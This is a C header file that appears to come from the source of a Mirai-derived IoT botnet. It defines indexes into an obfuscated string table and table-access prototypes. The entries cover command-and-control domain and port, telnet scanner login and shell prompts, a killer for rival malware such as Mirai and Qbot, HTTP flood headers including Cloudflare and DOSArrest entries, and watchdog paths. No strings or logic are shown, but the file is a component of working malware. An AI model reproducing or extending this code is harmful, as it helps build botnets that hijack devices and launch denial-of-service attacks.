#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_SCAN_SHELL 2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4 
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_ASSWORD 11
#define TABLE_SCAN_OGIN 12
#define TABLE_SCAN_ENTER 13
#define TABLE_SCAN_POST 14
#define TABLE_SCAN_CONTENTLEN 15
#define TABLE_SCAN_CONNECTION 16
#define TABLE_SCAN_ACCEPT 17
#define TABLE_SCAN_CB_DOMAIN            18
#define TABLE_SCAN_CB_PORT              19
#define TABLE_SCAN_AUTH 20
#define TABLE_SCAN_HEADER 21
#define TABLE_SCAN_HEADER2 22
#define TABLE_KILLER_PROC 23
#define TABLE_KILLER_EXE 24
#define TABLE_KILLER_FD 25
#define TABLE_KILLER_MAPS 26
#define TABLE_KILLER_TCP 27
#define TABLE_MAPS_MIRAI 28
#define TABLE_MAPS_QBOT 29
#define TABLE_MAPS_UPX 30
#define TABLE_MAPS_MARIKO 31

#define TABLE_EXEC_YAKUZA 32
#define TABLE_EXEC_GEMINI 33
#define TABLE_EXEC_SHIKAI 34
#define TABLE_EXEC_MIRAI1 35
#define TABLE_EXEC_MIRAI2 36
#define TABLE_EXEC_MIRAI3 37
#define TABLE_EXEC_MIRAI4 38
#define TABLE_EXEC_MIRAI5 39
#define TABLE_EXEC_MIRAI6 40
#define TABLE_EXEC_MIRAI7 41
#define TABLE_EXEC_MIRAI8 42
#define TABLE_EXEC_MIRAI9 43
#define TABLE_EXEC_MIRAI10 44
#define TABLE_EXEC_MIRAI11 45
#define TABLE_EXEC_MIRAI12 46
#define TABLE_EXEC_MIRAI13 47
#define TABLE_EXEC_MIRAI14 48
#define TABLE_EXEC_MIRAI15 49
#define TABLE_EXEC_MIRAI16 50
#define TABLE_EXEC_MIRAI17 51
#define TABLE_EXEC_MIRAI18 52
#define TABLE_EXEC_MIRAI19 53
#define TABLE_EXEC_MIRAI20 54
#define TABLE_EXEC_MIRAI21 55
#define TABLE_EXEC_MIRAI22 56
#define TABLE_EXEC_MIRAI23 57
#define TABLE_EXEC_MIRAI24 58
#define TABLE_EXEC_MIRAI25 59
#define TABLE_EXEC_MIRAI26 60

#define TABLE_ATK_VSE 61
#define TABLE_ATK_RESOLVER 62
#define TABLE_ATK_NSERV 63
#define TABLE_ATK_KEEP_ALIVE            64
#define TABLE_ATK_ACCEPT                65
#define TABLE_ATK_ACCEPT_LNG            66
#define TABLE_ATK_CONTENT_TYPE          67
#define TABLE_ATK_SET_COOKIE            68
#define TABLE_ATK_REFRESH_HDR           69
#define TABLE_ATK_LOCATION_HDR          70
#define TABLE_ATK_SET_COOKIE_HDR        71
#define TABLE_ATK_CONTENT_LENGTH_HDR    72
#define TABLE_ATK_TRANSFER_ENCODING_HDR 73
#define TABLE_ATK_CHUNKED               74
#define TABLE_ATK_KEEP_ALIVE_HDR        75
#define TABLE_ATK_CONNECTION_HDR        76
#define TABLE_ATK_DOSARREST             77
#define TABLE_ATK_CLOUDFLARE_NGINX      78
#define TABLE_HTTP_1                  	79
#define TABLE_HTTP_2                  	80
#define TABLE_HTTP_3                	81
#define TABLE_HTTP_4                 	82 
#define TABLE_HTTP_5                 	83
#define TABLE_HTTP_6                 	84
#define TABLE_HTTP_7                 	85
#define TABLE_HTTP_8                 	86
#define TABLE_HTTP_9                 	87
#define TABLE_HTTP_10                 	88
#define TABLE_HTTP_11                 	89
#define TABLE_HTTP_12                 	90
#define TABLE_HTTP_13                 	91
#define TABLE_HTTP_14                 	92
#define TABLE_HTTP_15                 	93
#define TABLE_MISC_WATCHDOG 94
#define TABLE_MISC_WATCHDOG2 95
#define TABLE_MISC_WATCHDOG3 96
#define TABLE_MISC_WATCHDOG4 97
#define TABLE_MISC_WATCHDOG5 98
#define TABLE_MISC_WATCHDOG6 99
#define TABLE_MISC_WATCHDOG7 100
#define TABLE_MISC_WATCHDOG8 101
#define TABLE_MISC_RANDOM 102


#define TABLE_MAX_KEYS 103

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
